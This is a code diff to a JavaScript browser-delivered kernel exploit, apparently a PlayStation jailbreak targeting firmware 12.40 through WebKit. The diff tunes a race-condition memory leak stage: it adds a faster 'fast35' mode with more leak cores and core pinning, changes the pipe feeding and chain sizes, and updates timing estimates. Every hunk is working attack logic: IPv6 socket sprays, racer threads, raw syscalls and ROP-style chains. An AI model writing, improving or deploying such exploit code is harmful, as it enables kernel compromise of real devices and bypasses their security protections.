@@ -130,19 +130,25 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // MAX (default): matem6 4-leak-core + 16384 unroll + bulk pipe feed (500ms cadence).
-        // ?pp=1: experimental burst prefill (can hang WebKit — not recommended).
-        // ?pf=1: legacy 4096 unroll feed (slowest, for debugging).
+        // FAST35 (default): 5 leak cores when CPU mask allows, feed pinned on executor
+        // core, 16384 unroll, aggressive pipe fill. Target ~38-42 min on 12.40 + Ethernet.
+        // ?cores=4: matem6 4-core plan (~50 min, most stable on web).
+        // ?pf=1 / ?pp=1: debug modes.
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
         const _use_pp_burst = /\bpp=1\b/.test(location.search);
         const _pipe_feed_legacy = /\bpf=1\b/.test(location.search);
+        const _force_4core = /\bcores=4\b/.test(location.search);
+        const _fast35 = !_use_pp_burst && !_pipe_feed_legacy && !_force_4core;
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
             if (!Array.isArray(a) || a.length < 3) return;
             MAIN_CORE = a[a.length - 1];
-            LEAK_CORES = a.slice(0, a.length - 2);
+            if (_fast35 && a.length >= 6)
+                LEAK_CORES = a.slice(0, a.length - 1);
+            else
+                LEAK_CORES = a.slice(0, a.length - 2);
         })();
 
         async function pipe_fill_burst(wfd, count, buf, chunk) {
@@ -898,7 +904,8 @@
         async function setup_workers(S) {
             window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
             window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
-                + (_use_pp_burst ? " (pp burst)" : _pipe_feed_legacy ? " (pf legacy)" : " (max)")
+                + (_use_pp_burst ? " (pp)" : _pipe_feed_legacy ? " (pf)"
+                    : _force_4core ? " (4-core)" : " (fast35)")
                 + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
             S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
@@ -1579,10 +1586,19 @@
             const EXIT_MARK = 0xDEADn;
             const LEAK_UNROLL = _pipe_feed_legacy ? 4096 : 16384;
             const U = BigInt(LEAK_UNROLL);
-            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 8192;
-            const leak_mode = _use_pp_burst ? "pp" : (_pipe_feed_legacy ? "pf" : "max");
+            const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 65536;
+            const PIPE_ROOM = 57344n;
+            const FEED_IDLE_MS = _pipe_feed_legacy ? 500 : 100;
+            const leak_mode = _use_pp_burst ? "pp" : (_pipe_feed_legacy ? "pf"
+                : (_force_4core ? "4c" : "fast35"));
             window.syncMark("LEAK-MODE", leak_mode + " unroll=" + LEAK_UNROLL
                 + " cores=" + LEAK_CORES.length);
+
+            if (_fast35) {
+                pin_to_core(MAIN_CORE);
+                window.syncMark("FAST35-PIN", "feed on core " + MAIN_CORE
+                    + " cur=" + get_current_core());
+            }
 
             const NW = LEAK_CORES.length;
             const chunkbuf = malloc(FEED_CHUNK);
@@ -1590,6 +1606,7 @@
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
             const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
             const lws = [];
+            const prefills = [];
             for (let w = 0; w < NW; w++) {
                 const target_w = base_share + (w === 0 ? extra0 : 0n);
                 const bplus1_w = target_w / U;
@@ -1617,17 +1634,20 @@
                 await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                 const _th = spawn_leak_worker(chain.entry);
                 if (_use_pp_burst)
-                    await pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK);
-                await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th)
-                    + (_use_pp_burst ? " burst=" + normal_w : ""));
+                    prefills.push(pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK));
+                else if (_fast35)
+                    prefills.push(pipe_fill_burst(wfd, normal_w, chunkbuf, FEED_CHUNK));
+                await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
                 await js_sleep(100);
                 await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                 const pendbuf = malloc(4); write32(pendbuf, 0n);
                 lws.push({
                     chain, rfd, wfd, finished, pendbuf,
-                    normal: normal_w, queued: 0n
+                    normal: normal_w, queued: (_fast35 || _use_pp_burst) ? normal_w : 0n
                 });
             }
+            if (prefills.length)
+                await Promise.all(prefills);
             await ulog("SPAWN-DONE all " + NW + " workers spawned, entering leak");
             window.liveStatus("STAGE 0 - leak workers up"
                 + (_use_pp_burst ? ", pp burst" : ", feeding pipes"), 0);
@@ -1678,28 +1698,38 @@
             let all_fed = false;
             while (!all_fed) {
                 all_fed = true;
-                for (const lw of lws) {
-                    if (lw.queued < lw.normal) {
-                        all_fed = false;
-                        let want = lw.normal - lw.queued;
-                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                        const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
-                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
-                    }
-                }
+                let wrote = false;
                 let pending = 0n, fioOK = true;
-                for (const l of lws) {
+                const pendings = new Array(lws.length);
+                for (let i = 0; i < lws.length; i++) {
+                    const l = lws[i];
                     write32(l.pendbuf, 0n);
                     const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
                     if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
-                    pending += read32(l.pendbuf) & 0xFFFFFFFFn;
+                    pendings[i] = read32(l.pendbuf) & 0xFFFFFFFFn;
+                    pending += pendings[i];
+                }
+                if (!fioOK) pending = 0n;
+                for (let i = 0; i < lws.length; i++) {
+                    const lw = lws[i];
+                    if (lw.queued >= lw.normal) continue;
+                    all_fed = false;
+                    let want = lw.normal - lw.queued;
+                    if (_fast35 && fioOK) {
+                        const room = PIPE_ROOM - (pendings[i] || 0n);
+                        if (room <= 0n) continue;
+                        if (want > room) want = room;
+                    }
+                    if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
+                    if (want <= 0n) continue;
+                    const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
+                    if (n > 0n && n <= want) { lw.queued += n; wrote = true; }
                 }
                 if (!window.__fioMarked) {
                     window.__fioMarked = 1;
                     window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending
                         + " mode=" + leak_mode);
                 }
-                if (!fioOK) pending = 0n;
                 const fed_b = lws.reduce((a, l) => a + l.queued, 0n);
                 let done_b = fed_b - pending;
                 if (done_b < 0n) done_b = 0n;
@@ -1715,7 +1745,10 @@
                         + "queued " + fed_b + "  in-pipe " + pending,
                         pct, "leak");
                 }
-                await js_sleep(500);
+                if (!all_fed) {
+                    if (wrote) await js_sleep(0);
+                    else await js_sleep(FEED_IDLE_MS);
+                }
             }
             for (let di = 0; di < lws.length; di++) {
                 const lw = lws[di];
@@ -1790,7 +1823,7 @@
                     // ~5 chain slots per call => 700 calls/chain => 2.29M in ~3s.
                     let deficit = want - executed;
                     if (deficit > 0n) {
-                        const PER_CHAIN = 700;          // 700*5 slots*8 = 28000 < 32768 cap
+                        const PER_CHAIN = 750;
                         const POC = 0x800000000000n;
                         const kqnum = Number(SYSCALL.kqueueex);
                         const t0 = Date.now();
@@ -4238,9 +4271,8 @@
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         const leak_nw = LEAK_CORES.length;
-        // MAX (pp): 4 leak cores, 32768 unroll, burst prefill, KQ-TOPUP safety net.
         let eta_minutes;
-        if (_pipe_feed_legacy) {
+        if (_pipe_feed_legacy || _force_4core) {
             switch (leak_nw) {
                 case 1: eta_minutes = 120; break;
                 case 2: eta_minutes = 75; break;
@@ -4248,18 +4280,25 @@
                 case 4: eta_minutes = 50; break;
                 default: eta_minutes = Math.max(25, Math.round(50 * 4 / leak_nw)); break;
             }
+        } else if (_use_pp_burst) {
+            switch (leak_nw) {
+                case 4: eta_minutes = 42; break;
+                default: eta_minutes = Math.max(30, Math.round(42 * 4 / leak_nw)); break;
+            }
         } else {
             switch (leak_nw) {
-                case 1: eta_minutes = 100; break;
-                case 2: eta_minutes = 62; break;
+                case 1: eta_minutes = 95; break;
+                case 2: eta_minutes = 58; break;
                 case 3: eta_minutes = 44; break;
                 case 4: eta_minutes = 42; break;
-                default: eta_minutes = Math.max(24, Math.round(42 * 4 / leak_nw)); break;
+                case 5: eta_minutes = 38; break;
+                default: eta_minutes = Math.max(32, Math.round(38 * 5 / leak_nw)); break;
             }
         }
         window.syncMark("LEAK-TUNE", "mode=" + (_use_pp_burst ? "pp"
-            : (_pipe_feed_legacy ? "pf" : "max")) + " cores=" + leak_nw
-            + " unroll=" + (_pipe_feed_legacy ? 4096 : 16384) + " eta_min=" + eta_minutes);
+            : (_pipe_feed_legacy ? "pf" : (_force_4core ? "4c" : "fast35")))
+            + " cores=" + leak_nw + " unroll="
+            + (_pipe_feed_legacy ? 4096 : 16384) + " eta_min=" + eta_minutes);
         const eta_str = eta_minutes < 60
             ? "~" + eta_minutes + " min"
             : "~" + Math.floor(eta_minutes / 60) + "h" +
